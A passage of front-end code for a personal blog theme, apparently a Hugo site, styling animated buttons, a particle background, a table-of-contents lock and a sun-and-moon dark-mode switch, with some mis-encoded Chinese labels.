  #backTopBtn.reappearing {
   animation: reappear 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
  }

  #backTopBtn.exploding {
   animation: explosionTransition 0.8s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
   z-index: 1000;
  }

  #backTopBtn.exploding .button-ripple {
   opacity: 0;
   animation-play-state: paused;
  }

  @keyframes explosionTransition {
   0% { transform: scale(1.6); opacity: 1; }
   100% { transform: scale(1); opacity: 1; }
  }

  @keyframes reappear {
   0% { transform: scale(0.85); opacity: 0.7; }
   100% { transform: scale(1); opacity: 1; }
  }

  .particle {
   position: absolute;
   top: 50%;
   left: 50%;
   width: 4px;
   height: 4px;
   background: radial-gradient(circle, #fff, #ffd700, #ff69b4, #87ceeb);
   border-radius: 50%;
   pointer-events: none;
   z-index: -2;
   animation: particleExplode 1s ease-out forwards;
  }

  @keyframes particleExplode {
   0% { transform: translate(-50%, -50%) scale(0); opacity: 1; }
   100% { transform: translate(-50%, -50%) scale(1) translate(var(--x), var(--y)); opacity: 0; }
  }

  .energy-wave {
   position: absolute;
   top: 50%;
   left: 50%;
   width: 0;
   height: 0;
   border: 2px solid transparent;
   border-radius: 50%;
   pointer-events: none;
   z-index: -3;
   animation: energyWave 1.2s ease-out forwards;
  }

  @keyframes energyWave {
   0% { width: 0; height: 0; border-color: rgba(255, 215, 0, 0.8); opacity: 1; }
   100% { width: 120px; height: 120px; border-color: rgba(255, 215, 0, 0); opacity: 0; }
  }

  .hero-aura {
   position: absolute;
   top: 50%;
   left: 50%;
   width: 100%;
   height: 100%;
   border-radius: 50%;
   background: conic-gradient(from 0deg, #ffd700, #ff69b4, #87ceeb, #98fb98, #ffa07a, #ffd700);
   background-size: 200% 200%;
   pointer-events: none;
   z-index: -4;
   animation: heroAura 2s linear infinite;
   opacity: 0;
   transition: opacity 0.3s ease;
  }

  #backTopBtn.sprinting .hero-aura { opacity: 0.6; }

  @keyframes heroAura {
   0% { background-position: 0% 0%; transform: translate(-50%, -50%) rotate(0deg); }
   100% { background-position: 100% 100%; transform: translate(-50%, -50%) rotate(360deg); }
  }

   
   
   
  @media (max-width: 768px) {
    #backTopBtn {
         
        left: auto;  
        right: 20px !important; 
        bottom: 20px;
        width: 40px;  
        height: 40px;
         
        box-shadow: 0 0 12px rgba(0, 191, 255, 0.7);
    }
    
     
    .button-tooltip {
        left: auto !important;
        right: 20px !important;
        bottom: 65px;  
    }
  }
  
  @media (max-width: 480px) {
     #backTopBtn {
       left: 15px !important;
       right: auto !important;
       bottom: 15px;
       width: 26px;
       height: 26px;
     }
     .button-tooltip {
       left: 15px !important;
       right: auto !important;
       bottom: 31px;
     }
  }

  .no-text-selection {
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
  }

   
   
   
  
  #rope-physics-container,
  #rope-svg-container {
    pointer-events: none; 
  }

  #pull-ring-physics {
    pointer-events: auto !important;
    touch-action: none; 
  }

   
  @media (max-width: 767px) {
    #rope-container,
    #rope-physics-container,
    #rope-svg-container,
    #pull-ring-physics {
      display: none !important;
      width: 0 !important;
      height: 0 !important;
      opacity: 0 !important;
      pointer-events: none !important;
    }
  }
  
  #rope-container {
    position: fixed;
    top: 0;
    left: 20px;
    z-index: 10002; 
    width: 50px;
    height: 100vh;
    pointer-events: none;
  }

   
   
   
  .highlight {
   max-height: 400px;
   overflow: hidden;
   position: relative;
   transition: max-height 0.3s ease-out;
  }

  .code-show {
   max-height: none !important;
  }

  .code-more-box {
   width: 100%;
   padding-top: 20px;
   background-image: linear-gradient(to bottom, rgba(255, 255, 255, 0), #fff);
   position: absolute;
   left: 0;
   right: 0;
   bottom: 0;
   z-index: 1;
   text-align: center;
  }

  .code-more-btn {
   display: inline-block;
   padding: 5px 15px;
   background: #f0f0f5;
   border-radius: 5px;
   cursor: pointer;
   font-size: 0.9em;
  }

   
   
   
  #particles-js {
   position: fixed;
   top: 0;
   left: 0;
   width: 100vw;
   height: 100vh;
   z-index: -1;
   pointer-events: none;
  }
  
  #particles-js canvas {
    position: fixed !important;
    top: 0 !important;
    left: 0 !important;
    width: 100vw !important;
    height: 100vh !important;
  }

   
   
   
  .toc-lock-btn {
    position: absolute;
    top: 32px;
    right: 5px;
    width: 28px;
    height: 28px;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    border-radius: 50%;
    transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
    background: rgba(0, 0, 0, 0.05);
    color: rgba(0, 0, 0, 0.7);
    z-index: 100;
    border: 1px solid rgba(0, 0, 0, 0.1);
    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
  }
  
  .toc-lock-btn:hover {
    background: rgba(0, 0, 0, 0.1);
    transform: scale(1.1);
    border-color: rgba(0, 0, 0, 0.2);
    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.15);
  }
  
  .toc-lock-btn:active {
    transform: scale(0.95);
  }
  
  .toc-lock-btn:focus {
    outline: none;
    border-color: rgba(0, 0, 0, 0.4);
    box-shadow: 0 0 0 3px rgba(0, 0, 0, 0.1), 0 2px 8px rgba(0, 0, 0, 0.1);
    background: rgba(0, 0, 0, 0.08);
  }
  
  .toc-lock-btn.locked {
    color: rgba(0, 0, 0, 0.9);
    background: rgba(0, 0, 0, 0.1);
    border-color: rgba(0, 0, 0, 0.3);
    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
  }
  
  .toc-lock-btn.locked:hover {
    background: rgba(0, 0, 0, 0.15);
    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.25);
  }
  
  .toc-lock-btn.locked .lock-icon.locked { display: block; }
  .toc-lock-btn.locked .lock-icon.unlocked { display: none; }
  .toc-lock-btn .lock-icon.locked { display: none; }
  .toc-lock-btn .lock-icon.unlocked { display: block; }
  
  .toc-lock-btn .lock-icon {
    width: 14px;
    height: 14px;
    stroke: currentColor;
    fill: none;
    stroke-width: 2.5;
    stroke-linecap: round;
    stroke-linejoin: round;
    transition: all 0.3s ease;
  }
  
  .toc-lock-label {
    position: absolute;
    top: 38px;
    right: 28px;
    font-size: 16px;
    color: rgba(0, 0, 0, 0.6);
    font-weight: 700;
    z-index: 100;
    user-select: none;
    pointer-events: none;
    line-height: 1;
    display: flex;
    align-items: center;
  }

  [data-scheme="dark"] .toc-lock-btn {
    background: rgba(255, 255, 255, 0.05);
    border-color: rgba(255, 255, 255, 0.1);
    color: rgba(255, 255, 255, 0.7);
  }
  
  [data-scheme="dark"] .toc-lock-btn:hover {
    background: rgba(255, 255, 255, 0.1);
    border-color: rgba(255, 255, 255, 0.2);
    box-shadow: 0 4px 16px rgba(255, 255, 255, 0.15);
  }
  
  [data-scheme="dark"] .toc-lock-btn:focus {
    outline: none;
    border-color: rgba(255, 255, 255, 0.4);
    box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.1), 0 2px 8px rgba(255, 255, 255, 0.1);
    background: rgba(255, 255, 255, 0.08);
  }
  
  [data-scheme="dark"] .toc-lock-btn.locked {
    color: rgba(255, 255, 255, 0.9);
    background: rgba(255, 255, 255, 0.1);
    border-color: rgba(255, 255, 255, 0.3);
    box-shadow: 0 2px 8px rgba(255, 255, 255, 0.2);
  }
  
  [data-scheme="dark"] .toc-lock-btn.locked:hover {
    background: rgba(255, 255, 255, 0.15);
    box-shadow: 0 4px 16px rgba(255, 255, 255, 0.25);
  }
  
  [data-scheme="dark"] .toc-lock-label {
    color: rgba(255, 255, 255, 0.6);
  }

  #TableOfContents[data-scrollspy-disabled="true"] { opacity: 0.8 !important; }
  #TableOfContents[data-scrollspy-disabled="true"] .active-class { display: block !important; opacity: 1 !important; }
  #TableOfContents[data-scrollspy-disabled="true"] a { cursor: pointer !important; }
</style>

<script src="https://cdnjs.cloudflare.com/ajax/libs/matter-js/0.19.0/matter.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>

<div id="rope-container"></div>

<div id="particles-js"></div>

<script>
particlesJS('particles-js', {
  "particles": {
    "number": { "value": 80, "density": { "enable": true, "value_area": 800 } },
    "color": { "value": ["#888888", "#aaaaaa", "#cccccc", "#eeeeee"] },
    "shape": { "type": "circle", "stroke": { "width": 0, "color": "#000000" }, "polygon": { "nb_sides": 5 } },
    "opacity": { "value": 0.5, "random": false, "anim": { "enable": false, "speed": 1, "opacity_min": 0.1, "sync": false } },
    "size": { "value": 2, "random": true, "anim": { "enable": false, "speed": 40, "size_min": 0.1, "sync": false } },
    "line_linked": { "enable": true, "distance": 150, "color": "#888888", "opacity": 0.4, "width": 1 },
    "move": { "enable": true, "speed": 2, "direction": "none", "random": false, "straight": false, "out_mode": "out", "bounce": false, "attract": { "enable": false, "rotateX": 600, "rotateY": 1200 } }
  },
  "interactivity": {
    "detect_on": "canvas",
    "events": { "onhover": { "enable": true, "mode": "grab" }, "onclick": { "enable": true, "mode": "push" }, "resize": true },
    "modes": { "grab": { "distance": 140, "line_linked": { "opacity": 1 } }, "bubble": { "distance": 400, "size": 40, "duration": 2, "opacity": 8, "speed": 3 }, "repulse": { "distance": 200, "duration": 0.4 }, "push": { "particles_nb": 4 }, "remove": { "particles_nb": 2 } }
  },
  "retina_detect": true
});
</script>

<script>
(function() {
  'use strict';
  const categoryColors = [
    '#ff6b6b', '#4ecdc4', '#45b7d1', '#96ceb4', '#feca57',
    '#ff9ff3', '#54a0ff', '#5f27cd', '#00d2d3', '#ff9f43',
    '#10ac84', '#ff6348', '#a55eea', '#e17055', '#d63031',
    '#00b894', '#fdcb6e', '#6c5ce7', '#fd79a8', '#f39c12',
    '#e67e22', '#e74c3c', '#9b59b6', '#3498db', '#1abc9c',
    '#16a085', '#27ae60', '#2ecc71', '#f1c40f', '#e67e22'
  ];
  function hashString(str) {
    let hash = 0;
    if (str.length === 0) return hash;
    for (let i = 0; i < str.length; i++) {
      const char = str.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash;
    }
    return Math.abs(hash);
  }
  function assignCategoryColors() {
    const isArchivesPage = document.body.classList.contains('template-archives') || window.location.pathname.includes('/archives/');
    const isArticlePage = document.querySelector('#TableOfContents') || document.querySelector('.article-category');
    
    if (isArticlePage && !isArchivesPage) {
      const categoryLinks = document.querySelectorAll('.article-category a');
      categoryLinks.forEach((link, index) => {
        const href = link.getAttribute('href');
        const categoryName = href.split('/').pop() || href.split('/').slice(-2, -1)[0] || 'default';
        const hash = hashString(categoryName);
        const colorIndex = hash % categoryColors.length;
        const backgroundColor = categoryColors[colorIndex];
        link.style.setProperty('background-color', backgroundColor, 'important');
        link.style.setProperty('color', '#fff', 'important');
        link.addEventListener('mouseenter', function() { this.style.opacity = '0.8'; this.style.transform = 'scale(1.05)'; });
        link.addEventListener('mouseleave', function() { this.style.opacity = '1'; this.style.transform = 'scale(1)'; });
      });
    }
    if (!isArchivesPage) {
      const sidebarCategories = document.querySelectorAll('.widget.categories a, .widget.tagCloud a');
      sidebarCategories.forEach((link, index) => {
        const href = link.getAttribute('href');
        const categoryName = href.split('/').pop() || href.split('/').slice(-2, -1)[0] || 'default';
        const hash = hashString(categoryName);
        const colorIndex = hash % categoryColors.length;
        const backgroundColor = categoryColors[colorIndex];
        link.style.setProperty('background-color', backgroundColor, 'important');
        link.style.setProperty('color', '#fff', 'important');
        link.style.setProperty('border-radius', '6px', 'important');
        link.style.setProperty('padding', '8px 12px', 'important');
        link.style.setProperty('margin', '4px 0', 'important');
        link.style.setProperty('display', 'inline-block', 'important');
        link.style.setProperty('text-decoration', 'none', 'important');
        link.style.setProperty('transition', 'all 0.3s ease', 'important');
        link.addEventListener('mouseenter', function() { this.style.opacity = '0.8'; this.style.transform = 'scale(1.05)'; this.style.boxShadow = '0 4px 12px rgba(0, 0, 0, 0.2)'; });
        link.addEventListener('mouseleave', function() { this.style.opacity = '1'; this.style.transform = 'scale(1)'; this.style.boxShadow = 'none'; });
      });
    }
  }
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', assignCategoryColors); else assignCategoryColors();
  setTimeout(assignCategoryColors, 500);
  setTimeout(assignCategoryColors, 1000);
  setTimeout(assignCategoryColors, 2000);
  const observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
      if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
        const hasNewCategories = Array.from(mutation.addedNodes).some(node => {
          return node.nodeType === 1 && (node.classList.contains('article-category') || node.querySelector('.article-category') || node.classList.contains('widget') || node.querySelector('.widget'));
        });
        if (hasNewCategories) { setTimeout(assignCategoryColors, 100); setTimeout(assignCategoryColors, 500); }
      }
    });
  });
  observer.observe(document.body, { childList: true, subtree: true });
})();
</script>

<script>
(function() {
  'use strict';
  function fixDarkModeToggleText() {
    const toggleBtn = document.getElementById('dark-mode-toggle');
    if (!toggleBtn) return;
    toggleBtn.classList.add('dark-mode-toggle-fix');
    const span = toggleBtn.querySelector('span');
    if (!span) return;
    function updateText() {
      const isDark = document.documentElement.dataset.scheme === 'dark';
      span.textContent = isDark ? 'äº®è‰²æ¨¡å¼' : 'æš—è‰²æ¨¡å¼';
    }
    updateText();
    function handleThemeChange() { setTimeout(updateText, 100); }
    window.addEventListener('onColorSchemeChange', handleThemeChange);
    const observer = new MutationObserver(function(mutations) {
      mutations.forEach(function(mutation) {
        if (mutation.type === 'attributes' && mutation.attributeName === 'data-scheme') handleThemeChange();
      });
    });
    observer.observe(document.documentElement, { attributes: true, attributeFilter: ['data-scheme'] });
    window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', handleThemeChange);
    toggleBtn.addEventListener('click', function() { setTimeout(updateText, 200); });
  }
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', fixDarkModeToggleText); else fixDarkModeToggleText();
  setTimeout(fixDarkModeToggleText, 1000);
  setTimeout(fixDarkModeToggleText, 2000);
})();
</script>

  <script>
  if (!document.getElementById('new-theme-switch')) {
    document.write(`
      <div id="new-theme-switch">
        <label class="theme-switch">
          <input type="checkbox" class="theme-switch__checkbox" id="theme-switch-checkbox">
          <div class="theme-switch__container">
            <div class="theme-switch__clouds"></div>
            <div class="theme-switch__stars-container">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 144 55" fill="none">
                <path fill-rule="evenodd" clip-rule="evenodd" d="M135.831 3.00688C135.055 3.85027 134.111 4.29946 133 4.35447C134.111 4.40947 135.055 4.85867 135.831 5.71123C136.607 6.55462 136.996 7.56303 136.996 8.72727C136.996 7.95722 137.172 7.25134 137.525 6.59129C137.886 5.93124 138.372 5.39954 138.98 5.00535C139.598 4.60199 140.268 4.39114 141 4.35447C139.88 4.2903 138.936 3.85027 138.16 3.00688C137.384 2.16348 136.996 1.16425 136.996 0C136.996 1.16425 136.607 2.16348 135.831 3.00688ZM31 23.3545C32.1114 23.2995 33.0551 22.8503 33.8313 22.0069C34.6075 21.1635 34.9956 20.1642 34.9956 19C34.9956 20.1642 35.3837 21.1635 36.1599 22.0069C36.9361 22.8503 37.8798 23.2903 39 23.3545C38.2679 23.3911 37.5976 23.602 36.9802 24.0053C36.3716 24.3995 35.8864 24.9312 35.5248 25.5913C35.172 26.2513 34.9956 26.9572 34.9956 27.7273C34.9956 26.563 34.6075 25.5546 33.8313 24.7112C33.0551 23.8587 32.1114 23.4095 31 23.3545ZM0 36.3545C1.11136 36.2995 2.05513 35.8503 2.83131 35.0069C3.6075 34.1635 3.99559 33.1642 3.99559 32C3.99559 33.1642 4.38368 34.1635 5.15987 35.0069C5.93605 35.8503 6.87982 36.2903 8 36.3545C7.26792 36.3911 6.59757 36.602 5.98015 37.0053C5.37155 37.3995 4.88644 37.9312 4.52481 38.5913C4.172 39.2513 3.99559 39.9572 3.99559 40.7273C3.99559 39.563 4.38368 38.5546 2.83131 37.7112C2.05513 36.8587 1.11136 36.4095 0 36.3545ZM56.8313 24.0069C56.0551 24.8503 55.1114 25.2995 54 25.3545C55.1114 25.4095 56.0551 25.8587 56.8313 26.7112C57.6075 27.5546 57.9956 28.563 57.9956 29.7273C57.9956 28.9572 58.172 28.2513 58.5248 27.5913C58.8864 26.9312 59.3716 26.3995 59.9802 26.0053C60.5976 25.602 61.2679 25.3911 62 25.3545C60.8798 25.2903 59.9361 24.8503 59.1599 24.0069C58.3837 23.1635 57.9956 22.1642 57.9956 21C57.9956 22.1642 57.6075 23.1635 56.8313 24.0069ZM81 25.3545C82.1114 25.2995 83.0551 24.8503 83.8313 24.0069C84.6075 23.1635 84.9956 22.1642 84.9956 21C84.9956 22.1642 85.3837 23.1635 86.1599 24.0069C86.9361 24.8503 87.8798 25.2903 89 25.3545C88.2679 25.3911 87.5976 25.602 86.9802 26.0053C86.3716 26.3995 85.8864 26.9312 85.5248 27.5913C85.172 28.2513 84.9956 28.9572 84.9956 29.7273C84.9956 28.563 84.6075 27.5546 83.8313 26.7112C83.0551 25.8587 82.1114 25.4095 81 25.3545ZM136 36.3545C137.111 36.2995 138.055 35.8503 138.831 35.0069C139.607 34.1635 139.996 33.1642 139.996 32C139.996 33.1642 140.384 34.1635 141.16 35.0069C141.936 35.8503 142.88 36.2903 144 36.3545C143.268 36.3911 142.598 36.602 141.98 37.0053C141.372 37.3995 140.886 37.9312 140.525 38.5913C140.172 39.2513 139.996 39.9572 139.996 40.7273C139.996 39.563 139.607 38.5546 138.831 37.7112C138.055 36.8587 137.111 36.4095 136 36.3545ZM101.831 49.0069C101.055 49.8503 100.111 50.2995 99 50.3545C100.111 50.4095 101.055 50.8587 101.831 51.7112C102.607 52.5546 102.996 53.563 102.996 54.7273C102.996 53.9572 103.172 53.2513 103.525 52.5913C103.886 51.9312 104.372 51.3995 104.98 51.0053C105.598 50.602 106.268 50.3911 107 50.3545C105.88 50.2903 104.936 49.8503 104.16 49.0069C103.384 48.1635 102.996 47.1642 102.996 46C102.996 47.1642 102.607 48.1635 101.831 49.0069Z" fill="currentColor"></path>
              </svg>
            </div>
            <div class="theme-switch__circle-container">
              <div class="theme-switch__sun-moon-container">
                <div class="theme-switch__moon">
                  <div class="theme-switch__spot"></div>
                  <div class="theme-switch__spot"></div>
                  <div class="theme-switch__spot"></div>
                </div>
              </div>
            </div>
          </div>
        </label>
        <div id="theme-switch-text" style="color: #fff; font-size: 14px; font-weight: 600; text-shadow: 0 1px 2px rgba(0,0,0,0.5); margin-top: 8px; text-align: center;">äº®è‰²æ¨¡å¼</div>
      </div>
    `);
  }
  </script>

<style>
   
  #new-theme-switch {
    position: fixed;
    bottom: 50px;
    left: 50px;
    z-index: 1000;
    text-align: center;
    width: fit-content;  
  }

  .theme-switch {
    --toggle-size: 20px;
    --container-width: 3.75em;
    --container-height: 1.7em;
    --container-radius: 4.2em;
    --container-light-bg: #3D7EAE;
    --container-night-bg: #1D1F2C;
    --circle-container-diameter: 2.25em;
    --sun-moon-diameter: 1.4em;
    --sun-bg: #ECCA2F;
    --moon-bg: #C4C9D1;
    --spot-color: #959DB1;
    --circle-container-offset: calc((var(--circle-container-diameter) - var(--container-height)) / 2 * -1);
    --stars-color: #fff;
    --clouds-color: #F3FDFF;
    --back-clouds-color: #AACADF;
    --transition: .5s cubic-bezier(0, -0.02, 0.4, 1.25);
    --circle-transition: .3s cubic-bezier(0, -0.02, 0.35, 1.17);
  }

   
  @media (max-width: 768px) {
    #new-theme-switch {
      left: auto !important;    
      right: 20px !important;   
      bottom: 20px !important;  
      transform: scale(0.8);    
      transform-origin: bottom right;  
      z-index: 9999 !important;  
    }
    
     
    #theme-switch-text {
      font-size: 12px !important;
      margin-top: 4px !important;
    }
  }

  .theme-switch, .theme-switch *, .theme-switch *::before, .theme-switch *::after {
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    font-size: var(--toggle-size);
  }

  .theme-switch__container {
    width: var(--container-width);
    height: var(--container-height);
    background-color: var(--container-light-bg);
    border-radius: var(--container-radius);
    overflow: hidden;
    cursor: pointer;
    -webkit-box-shadow: 0em -0.062em 0.062em rgba(0, 0, 0, 0.25), 0em 0.062em 0.125em rgba(255, 255, 255, 0.94);
    box-shadow: 0em -0.062em 0.062em rgba(0, 0, 0, 0.25), 0em 0.062em 0.125em rgba(255, 255, 255, 0.94);
    -webkit-transition: var(--transition);
    -o-transition: var(--transition);
    transition: var(--transition);
    position: relative;
  }

  .theme-switch__container::before {
    content: "";
    position: absolute;
    z-index: 1;
    inset: 0;
    -webkit-box-shadow: 0em 0.05em 0.187em rgba(0, 0, 0, 0.25) inset, 0em 0.05em 0.187em rgba(0, 0, 0, 0.25) inset;
    box-shadow: 0em 0.05em 0.187em rgba(0, 0, 0, 0.25) inset, 0em 0.05em 0.187em rgba(0, 0, 0, 0.25) inset;
    border-radius: var(--container-radius)
  }

  .theme-switch__checkbox { display: none; }

  .theme-switch__circle-container {
    width: var(--circle-container-diameter);
    height: var(--circle-container-diameter);
    background-color: rgba(255, 255, 255, 0.1);
    position: absolute;
    left: var(--circle-container-offset);
    top: var(--circle-container-offset);
    border-radius: var(--container-radius);
    -webkit-box-shadow: inset 0 0 0 3.375em rgba(255, 255, 255, 0.1), inset 0 0 0 3.375em rgba(255, 255, 255, 0.1), 0 0 0 0.625em rgba(255, 255, 255, 0.1), 0 0 0 1.25em rgba(255, 255, 255, 0.1);
    box-shadow: inset 0 0 0 3.375em rgba(255, 255, 255, 0.1), inset 0 0 0 3.375em rgba(255, 255, 255, 0.1), 0 0 0 0.625em rgba(255, 255, 255, 0.1), 0 0 0 1.25em rgba(255, 255, 255, 0.1);
    display: -webkit-box;
    display: -ms-flexbox;
    display: flex;
    -webkit-transition: var(--circle-transition);
    -o-transition: var(--circle-transition);
    transition: var(--circle-transition);
    pointer-events: none;
  }

  .theme-switch__sun-moon-container {
    pointer-events: auto;
    position: relative;
    z-index: 2;
    width: var(--sun-moon-diameter);
    height: var(--sun-moon-diameter);
    margin: auto;
    border-radius: var(--container-radius);
    background-color: var(--sun-bg);
    -webkit-box-shadow: 0.062em 0.062em 0.062em 0em rgba(254, 255, 239, 0.61) inset, 0em -0.062em 0.062em 0em #a1872a inset;
    box-shadow: 0.062em 0.062em 0.062em 0em rgba(254, 255, 239, 0.61) inset, 0em -0.062em 0.062em 0em #a1872a inset;
    -webkit-filter: drop-shadow(0.062em 0.125em 0.125em rgba(0, 0, 0, 0.25)) drop-shadow(0em 0.062em 0.125em rgba(0, 0, 0, 0.25));
    filter: drop-shadow(0.062em 0.125em 0.125em rgba(0, 0, 0, 0.25)) drop-shadow(0em 0.062em 0.125em rgba(0, 0, 0, 0.25));
    overflow: hidden;
    -webkit-transition: var(--transition);
    -o-transition: var(--transition);
    transition: var(--transition);
  }

  .theme-switch__moon {
    -webkit-transform: translateX(100%);
    -ms-transform: translateX(100%);
    transform: translateX(100%);
    width: 100%;
    height: 100%;
    background-color: var(--moon-bg);
    border-radius: inherit;
    -webkit-box-shadow: 0.062em 0.062em 0.062em 0em rgba(254, 255, 239, 0.61) inset, 0em -0.062em 0.062em 0em #969696 inset;
    box-shadow: 0.062em 0.062em 0.062em 0em rgba(254, 255, 239, 0.61) inset, 0em -0.062em 0.062em 0em #969696 inset;
    -webkit-transition: var(--transition);
    -o-transition: var(--transition);
    transition: var(--transition);
    position: relative;
  }

  .theme-switch__spot {
    position: absolute;
    top: 0.75em;
    left: 0.312em;
    width: 0.75em;
    height: 0.75em;
    border-radius: var(--container-radius);
    background-color: var(--spot-color);
    -webkit-box-shadow: 0em 0.0312em 0.062em rgba(0, 0, 0, 0.25) inset;
    box-shadow: 0em 0.0312em 0.062em rgba(0, 0, 0, 0.25) inset;
  }

  .theme-switch__spot:nth-of-type(2) {
    width: 0.375em;
    height: 0.375em;
    top: 0.937em;
    left: 1.375em;
  }

  .theme-switch__spot:nth-last-of-type(3) {
    width: 0.25em;
    height: 0.25em;
    top: 0.312em;
    left: 0.812em;
  }

  .theme-switch__clouds {
    width: 1.25em;
    height: 1.25em;
    background-color: var(--clouds-color);
    border-radius: var(--container-radius);
    position: absolute;
    bottom: -0.625em;
    left: 0.312em;
    -webkit-box-shadow: 0.937em 0.312em var(--clouds-color), -0.312em -0.312em var(--back-clouds-color), 1.437em 0.375em var(--clouds-color), 0.5em -0.125em var(--back-clouds-color), 2.187em 0 var(--clouds-color), 1.25em -0.062em var(--back-clouds-color), 2.937em 0.312em var(--clouds-color), 2em -0.312em var(--back-clouds-color), 3.625em -0.062em var(--clouds-color), 2.625em 0em var(--back-clouds-color), 4.5em -0.312em var(--clouds-color), 3.375em -0.437em var(--back-clouds-color), 4.625em -1.75em 0 0.437em var(--clouds-color), 4em -0.625em var(--back-clouds-color), 4.125em -2.125em 0 0.437em var(--back-clouds-color);
    box-shadow: 0.937em 0.312em var(--clouds-color), -0.312em -0.312em var(--back-clouds-color), 1.437em 0.375em var(--clouds-color), 0.5em -0.125em var(--back-clouds-color), 2.187em 0 var(--clouds-color), 1.25em -0.062em var(--back-clouds-color), 2.937em 0.312em var(--clouds-color), 2em -0.312em var(--back-clouds-color), 3.625em -0.062em var(--clouds-color), 2.625em 0em var(--back-clouds-color), 4.5em -0.312em var(--clouds-color), 3.375em -0.437em var(--back-clouds-color), 4.625em -1.75em 0 0.437em var(--clouds-color), 4em -0.625em var(--back-clouds-color), 4.125em -2.125em 0 0.437em var(--back-clouds-color);
    -webkit-transition: 0.5s cubic-bezier(0, -0.02, 0.4, 1.25);
    -o-transition: 0.5s cubic-bezier(0, -0.02, 0.4, 1.25);
    transition: 0.5s cubic-bezier(0, -0.02, 0.4, 1.25);
  }

  .theme-switch__stars-container {
    position: absolute;
    color: var(--stars-color);
    top: -100%;
    left: 0.312em;
    width: 2.75em;
    height: auto;
    -webkit-transition: var(--transition);
    -o-transition: var(--transition);
    transition: var(--transition);
  }

  .theme-switch__checkbox:checked + .theme-switch__container {
    background-color: var(--container-night-bg);
  }

  .theme-switch__checkbox:checked + .theme-switch__container .theme-switch__circle-container {
    left: calc(100% - var(--circle-container-offset) - var(--circle-container-diameter));
  }

  .theme-switch__checkbox:checked + .theme-switch__container .theme-switch__circle-container:hover {
    left: calc(100% - var(--circle-container-offset) - var(--circle-container-diameter) - 0.187em)
  }

  .theme-switch__circle-container:hover {
    left: calc(var(--circle-container-offset) + 0.187em);
  }

  .theme-switch__checkbox:checked + .theme-switch__container .theme-switch__moon {
    -webkit-transform: translate(0);
    -ms-transform: translate(0);
    transform: translate(0);
    transform: translate(0);
  }

  .theme-switch__checkbox:checked + .theme-switch__container .theme-switch__clouds {
    bottom: -4.062em;
  }

  .theme-switch__checkbox:checked + .theme-switch__container .theme-switch__stars-container {
    top: 50%;
    -webkit-transform: translateY(-50%);
    -ms-transform: translateY(-50%);
    transform: translateY(-50%);
  }

  #dark-mode-toggle { display: none !important; }
  .dark-mode-toggle-fix span { font-size: 18px !important; font-weight: 600 !important; }
</style>

<script>
(function() {
  'use strict';
  if (window.themeSwitchInitialized) return;
  let isInitialized = false;
  let observer = null;
  function initNewThemeSwitch() {
    if (isInitialized) return;
    const checkbox = document.getElementById('theme-switch-checkbox');
    if (!checkbox) return;
    function updateCheckboxState() {
      const isDark = document.documentElement.dataset.scheme === 'dark';
      checkbox.checked = isDark;
      const textElement = document.getElementById('theme-switch-text');
      if (textElement) textElement.textContent = isDark ? 'æš—è‰²æ¨¡å¼' : 'äº®è‰²æ¨¡å¼';
    }
    function waitForThemeSystem() {
      const schemeFromData = document.documentElement.dataset.scheme;
      const schemeFromClass = document.documentElement.className.includes('dark') ? 'dark' : (document.documentElement.className.includes('light') ? 'light' : null);
      const schemeFromLocalStorage = localStorage.getItem('StackColorScheme');
      if (schemeFromData || schemeFromClass || schemeFromLocalStorage) {
        let finalScheme = schemeFromData || schemeFromClass || schemeFromLocalStorage;
        if (schemeFromData) finalScheme = schemeFromData;
        document.documentElement.dataset.scheme = finalScheme;
        updateCheckboxState();
        isInitialized = true;
        window.themeSwitchInitialized = true;
      } else { setTimeout(waitForThemeSystem, 100); }
    }
    waitForThemeSystem();
    checkbox.addEventListener('change', function() {
      const scheme = this.checked ? 'dark' : 'light';
      document.documentElement.dataset.scheme = scheme;
      localStorage.setItem('StackColorScheme', scheme);
      document.dispatchEvent(new CustomEvent('onColorSchemeChange'));
    });
    window.addEventListener('onColorSchemeChange', updateCheckboxState);
    observer = new MutationObserver(function(mutations) {
      mutations.forEach(function(mutation) {
        if (mutation.type === 'attributes' && mutation.attributeName === 'data-scheme') updateCheckboxState();
      });
    });
    observer.observe(document.documentElement, { attributes: true, attributeFilter: ['data-scheme'] });
  }
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', initNewThemeSwitch); else initNewThemeSwitch();
  setTimeout(initNewThemeSwitch, 1500);
})();
</script>

<script>
(function() {
  'use strict';
  if (window.hoverEffectsInitialized) return;
  let isHoverEffectsInitialized = false;
  let hoverObserver = null;
  function forceCategoryHoverEffects() {
    if (isHoverEffectsInitialized) return;
    const articles = document.querySelectorAll('.article-list--compact article');
    if (articles.length > 0) {
      articles.forEach(article => {
        if (article.hasAttribute('data-hover-initialized')) return;
        article.style.setProperty('transition', 'all 0.3s ease', 'important');
        article.style.setProperty('will-change', 'transform, box-shadow', 'important');
        article.addEventListener('mouseenter', function() { this.style.setProperty('transform', 'translateY(-5px)', 'important'); this.style.setProperty('box-shadow', '0 10px 30px rgba(0, 0, 0, 0.12)', 'important'); });
        article.addEventListener('mouseleave', function() { this.style.setProperty('transform', 'translateY(0)', 'important'); this.style.setProperty('box-shadow', 'none', 'important'); });
        article.setAttribute('data-hover-initialized', 'true');
      });
      isHoverEffectsInitialized = true;
      window.hoverEffectsInitialized = true;
    }
  }
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', forceCategoryHoverEffects); else forceCategoryHoverEffects();
